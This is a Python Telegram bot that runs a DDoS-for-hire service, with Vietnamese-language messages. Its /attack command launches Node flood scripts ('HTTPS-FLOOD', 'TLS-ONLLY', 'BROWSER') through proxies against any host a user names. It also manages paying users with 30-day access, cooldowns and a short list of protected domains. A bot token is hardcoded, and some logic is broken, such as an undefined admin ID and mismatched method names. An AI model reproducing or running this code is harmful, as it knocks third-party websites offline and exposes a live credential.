﻿import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6488748176:AAG7EvuCqFHPOHJKDfXHLai6rV61Hs59zSI'

bot = telebot.TeleBot(bot_token)

proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
    
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng : /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm {user_id}. Có Thể Sử Dụng Lệnh 30 Ngày.')

load_users_from_database()

@bot.message_handler(commands=['start', '2005','help','sua'])
def help(message):
    help_text = '''
   | • 𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑇𝑜 𝐷𝐷𝑂𝑆 𝐵𝑂𝑇 𝐹𝑅𝐸𝐸 | 𝐴𝐷𝑀𝐼𝑁 𝐵𝐸́ 𝑆𝑈̛̃𝐴  🍼
   | • /methods [ 𝑆ℎ𝑜𝑤 𝑙𝑖𝑠𝑡 𝑀𝑒𝑡ℎ𝑜𝑑𝑠  ]
   | • /plan [ 𝑆ℎ𝑜𝑤 𝑃𝑙𝑎𝑛 𝐹𝑟𝑒𝑒 | 𝑋𝑈𝐾𝐴 𝐷𝐷𝑂𝑆 ]
   | • /admin [ 𝑆ℎ𝑜𝑤 𝑖𝑛𝑓𝑜 𝐴𝑑𝑚𝑖𝑛 ' 𝐵𝑒́ 𝑆𝑢̛̃𝑎 𝑉𝑖𝑝 ' ]
   | • /time [ 𝑇ℎ𝑜̛̀𝑖 𝐺𝑖𝑎𝑛 𝐵𝑜𝑡 𝐻𝑜𝑎̣𝑡 𝐷𝑜̣̂𝑛𝑔 ]
'''
    bot.reply_to(message, help_text)
    

@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
                      |  FREE METHODS |
   ╔────────────────────────────────╗
    | - TLS-ONLLY
    | - BROWSER 
    | - Methods [ Plan Vip 100 % Power ]
    | - HTTPS-FLOOD [ Truel 65 % Power ]
    | - HTTPS-RATES [ Vip 75 % Power ]
    | - Attack | /attack + Methods + Target ]
   ╚────────────────────────────────╝
'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['plan'])
def plan(message):
    help_text = '''
    | 𝑃𝑙𝑎𝑛 𝐴𝑐𝑐𝑜𝑢𝑛𝑡 𝐼𝑁𝐹𝑂 𝑌𝑜𝑢 !
    | - 𝐹𝑟𝑒𝑒 !
    | 𝑀𝑎𝑥 𝐷𝑢𝑟𝑎𝑡𝑖𝑜𝑛 : 45 𝑆𝑒𝑐𝑜𝑛𝑠 !
    | 𝑅𝑢𝑙𝑒𝑠 : 𝐵𝑎𝑐𝑘𝑓𝑖𝑠 [ 𝐺𝑜𝑣 - 𝐸𝑑𝑢 - 𝐷𝑠𝑡𝑎𝑡 ]
    | 𝐶𝑜𝑛𝑐 : [ 1/3 ] 𝐵𝑎𝑠𝑖𝑐 !
    | 𝐴𝑑𝑚𝑖𝑛 : 𝐵𝑒́ 𝑆𝑢̛̃𝑎 a 🌸 
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, " 💤   𝑆𝑡𝑜𝑝 𝐴𝑡𝑡𝑎𝑐𝑘 ! 𝑇ℎ𝑎𝑛𝑘 𝐹𝑜𝑟 𝑌𝑜𝑢 .")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):

    if len(message.text.split()) < 3:
        bot.reply_to(message, ' 👻 𝐴𝑡𝑡𝑎𝑐𝑘 𝐻𝑜𝑤 𝑇𝑜 |  : /attack + [ Methods ] + [ Host ]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"𝐻𝑜𝑤 𝑇𝑜 𝐹𝑖𝑠𝑡 𝑆𝑒𝑐𝑜𝑛𝑠 {remaining_time} 𝐴𝑡𝑡𝑎𝑐𝑘 𝑁𝑜𝑡 𝑆𝑝𝑎𝑚 !.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    blocked_domains = ["chinhphu.vn", "begauvip.publicvm.com"]   
    if method == 'TLS-FLOODER' or method == 'TLS-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"[ 🚀 ]  𝐴𝑡𝑡𝑎𝑐𝑘 ! 𝑁𝑜𝑡 𝑆𝑝𝑎𝑚 𝐷𝐷𝑂𝑆 𝑤𝑒𝑏𝑠𝑖𝑡𝑒 𝐵𝑙𝑜𝑐𝑘 {blocked_domain}")
                return

    if method in ['TLS-ALPHA', 'TLS-ONLLY', 'BROWSER', 'HTTPS-FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'HTTPS-RATES':
            command = ["node", "HTTPS-RATES.js", host, "60", "150", "50", "GET", "proxy.txt"]
            duration = 60
        if method == 'BROWSER':
            command = ["node", "BROWSER", host, "45", "120", "25", "proxy.txt"]
            duration = 45
        if method == 'TLS-ONLLY':
            command = ["node", "TLS-ONLLY.js", host, "45", "75", "proxy.txt", "125", "9999"]
            duration = 45
        if method == 'HTTPS-FLOOD':
            command = ["node", "HTTPS-FLOOD.js", host, "45", "75", "25", "proxy.txt"]
            duration = 45

        cooldown_dict[username] = {'ddos': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'𝐴𝑡𝑡𝑎𝑐𝑘 𝑆𝑢𝑐𝑐𝑒𝑠𝐹𝑢𝑙𝑙𝑦 𝑆𝑒𝑛𝑡 𝑇𝑜 𝐻𝑜𝑠𝑡 : {host} | 𝑇𝑖𝑚𝑒 : {duration} 𝐷𝑢𝑟𝑎𝑡𝑖𝑜𝑛 !')
    else:
        bot.reply_to(message, '𝐴𝑡𝑡𝑎𝑐𝑘 𝑁𝑜𝑡 𝐼𝑛𝑑𝑖𝑣𝑎𝑙 𝑀𝑒𝑡ℎ𝑜𝑑𝑠 𝐿𝑎𝑦𝑒𝑟  7.')

# Hàm tính thời gian hoạt động của bot
start_time = time.time()
@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} 𝐺𝑖𝑜̛̀, {minutes} 𝑃ℎ𝑢́𝑡, {seconds} 𝐺𝑖𝑎̂𝑦'
    bot.reply_to(message, f'𝐵𝑜𝑡 𝐷𝑎̃ 𝐻𝑜𝑎̣𝑡 𝐷𝑜̣̂𝑛𝑔 𝐷𝑢̛𝑜̛̣𝑐: {uptime_str}')
@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, '𝐴𝑑𝑚𝑖𝑛 : @begaudeptry | ')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
